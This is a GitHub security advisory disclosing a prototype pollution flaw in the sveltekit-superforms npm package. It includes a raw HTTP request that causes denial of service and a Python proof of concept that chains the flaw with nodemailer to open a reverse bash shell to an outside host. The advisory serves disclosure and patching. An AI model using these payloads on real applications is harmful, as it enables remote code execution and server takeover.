# [H] `sveltekit-superforms` has Prototype Pollution in `parseFormData` function of `formData.js`

## Summary
Severity: High
Advisory: GHSA-hwmc-4c8j-xxj7
CVE: CVE-2025-62381
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:L/VI:L/VA:H/SC:L/SI:L/SA:L (CVSS_V4)
Published: 2025-10-15
Source: https://github.com/advisories/GHSA-hwmc-4c8j-xxj7
Type: github-advisory

## Affected
- npm: `sveltekit-superforms` — affected >=0 <2.27.4

## Details
### Summary
`sveltekit-superforms` v2.27.3 and prior are susceptible to a prototype pollution vulnerability within the `parseFormData` function of `formData.js`. An attacker can inject string and array properties into `Object.prototype`, leading to denial of service, type confusion, and potential remote code execution in downstream applications that rely on polluted objects.

### Details
Superforms is a SvelteKit form library for server and client form validation. Under normal operation, form validation is performed by calling the the `superValidate` function, with the submitted form data and a form schema as arguments:
```js
// https://superforms.rocks/get-started#posting-data
const form = await superValidate(request, your_adapter(schema));
 ```
 Within the `superValidate` function, a call is made to `parseRequest` in order to parse the user's input. `parseRequest` then calls into `parseFormData`, which in turn looks for the presence of `__superform_json` in the form parameters. If `__superform_json` is present, the following snippet is executed:
```js
// src/lib/formData.ts
if (formData.has('__superform_json')) {
	try {
		const transport =
			options && options.transport
				? Object.fromEntries(Object.entries(options.transport).map(([k, v]) => [k, v.decode]))
				: undefined;

		const output = parse(formData.getAll('__superform_json').join('') ?? '', transport);
		if (typeof output === 'object') {
			// Restore uploaded files and add to data
			const filePaths = Array.from(formData.keys());

			for (const path of filePaths.filter((path) => path.startsWith('__superform_file_'))) {
				const realPath = splitPath(path.substring(17));
				setPaths(output, [realPath], formData.get(path));
			}

			for (const path of filePaths.filter((path) => path.startsWith('__superform_files_'))) {
				const realPath = splitPath(path.substring(18));
				const allFiles = formData.getAll(path);

				setPaths(output, [realPath], Array.from(allFiles));
			}

			return output as Record<string, unknown>;
		}
	} catch {
		//
	}
 }
```
This snippet deserializes JSON input within the `__superform_json`, and then performs a nested assignment into the deserialized object using values from form parameters beginning with `__superform_file_` and `__superform_files_`. Since both the target property and value of the assignment is controlled by user input, an attacker can use this to pollute the base object prototype. For example, the following request will pollute `Object.prototype.toString`, which leads to a persistent denial of service in many applications:
```
POST /signup HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://example.com/signup
content-type: application/x-www-form-urlencoded
x-sveltekit-action: true
Content-Length: 70
Origin: http://example.com
Connection: keep-alive
Priority: u=0
Pragma: no-cache
Cache-Control: no-cache

__superform_json=[{}]&__superform_files___proto__.toString='corrupted'
```
### PoC
The following PoC demonstrates how this vulnerability can be escalated to remote code execution in the presence of suitable gadgets. The example app represents a typical application signup route, using the popular `nodemailer` library (5 million weekly downloads from npm).

`routes/signup/schema.ts`:
```js
import { z } from "zod/v4";

export const schema = z.object({
    email: z
        .email({
            error: "Please enter a valid email address.",
        })
        .min(1, {
            error: "Email address is required.",
        }),
    password: z.string().min(8, {
        error: "Password must be at least 8 characters long.",
    }),
});
```
`routes/signup/+page.server.ts`:
```js
import { zod4 } from "sveltekit-superforms/adapters";
import { fail, setError, superValidate } from "sveltekit-superforms";
import { schema } from "./schema";
import nodemailer from "nodemailer";
import {
    MAIL_USER,
    MAIL_CLIENT_ID,
    MAIL_CLIENT_SECRET,
    MAIL_REFRESH_TOKEN,
} from "$env/static/private";

export const actions = {
    default: async ({ request }) => {
        const form = await superValidate(request, zod4(schema));

        if (!form.valid) {
            return fail(400, { form });
        }

        // <insert other signup code here: DB ops, logging etc..>

        nodemailer
            .createTransport({
                service: "gmail",
                auth: {
                    type: "OAuth2",
                    user: MAIL_USER,
                    clientId: MAIL_CLIENT_ID,
                    clientSecret: MAIL_CLIENT_SECRET,
                    refreshToken: MAIL_REFRESH_TOKEN,
                },
            })
            .sendMail({
                to: form.data.email,
                subject: "Welcome to $app!",
                html: "<p> Welcome to $app. We hope you enjoy your stay.</p>",
                text: "Welcome to $app. We hope you enjoy your stay.",
            });
    },
};
```

The following Python script then pollutes the base object prototype in order to achieve RCE.
```python
#!/usr/bin/env python3

import requests

RHOST = "http://localhost:4173"
session = requests.Session()

r = session.post(
    f"{RHOST}/signup",
    data={
        "__superform_json": "[{}]",
        "__superform_file___proto__.sendmail": "1",
        "__superform_file___proto__.path": "/bin/bash",
        "__superform_files___proto__.args": [
            "-c",
            "bash -i >& /dev/tcp/dread.mantel.group/443 0>&1",
            "--",
        ],
    },
    headers={"Origin": RHOST},
)

r = session.post(
    f"{RHOST}/signup",
    data={"email": "me@example.com", "password": "usersignuppassword"},
    headers={"Origin": RHOST},
)
```
<img width="747" height="173" alt="image" src="https://github.com/user-attachments/assets/7b097187-7110-409a-915d-94782c15f597" />

In addition to `nodemailer`, the Language-Based Security group at KTH Royal Institute of Technology also compiles gadgets in many other [popular libraries and runtimes](https://github.com/KTH-LangSec/server-side-prototype-pollution), which can be used together with this vulnerability.

### Impact
Attackers can inject string and array properties into `Object.prototype`. This has a high probability of leading to denial of service and type confusion, with potential escalation to other impacts such as remote code execution, depending on the presence of reliable gadgets.

## References
- https://github.com/ciscoheat/sveltekit-superforms/security/advisories/GHSA-hwmc-4c8j-xxj7
- https://nvd.nist.gov/vuln/detail/CVE-2025-62381
- https://github.com/ciscoheat/sveltekit-superforms/commit/4a1310dd1a94176bb22036662c530dad48059ca4
- https://github.com/ciscoheat/sveltekit-superforms
